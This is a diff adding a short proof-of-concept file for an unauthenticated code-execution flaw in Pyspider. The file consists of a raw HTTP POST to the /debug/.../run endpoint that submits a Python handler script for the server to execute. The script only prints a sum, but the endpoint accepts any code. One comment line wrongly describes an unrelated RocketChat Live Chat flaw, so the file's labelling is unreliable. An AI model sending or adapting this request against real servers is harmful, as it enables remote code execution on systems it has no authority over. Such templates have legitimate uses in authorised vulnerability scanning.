@@ -1,0 +1,11 @@
+# Pyspider 未授权访问漏洞
+# RocketChat Live Chat接受可能允许未经身份验证访问消息和用户令牌的无效参数。
+POST /debug/pyspidervulntest/run?acid=80001581&bid=hd_tag_m8mv26fo HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26fo
+RM-PRO-Token: e3d430279eca43b8063be2f32752405a
+RM-PRO-Time: 1742808618957
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++print(str(452345672+%2B+567890765))&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
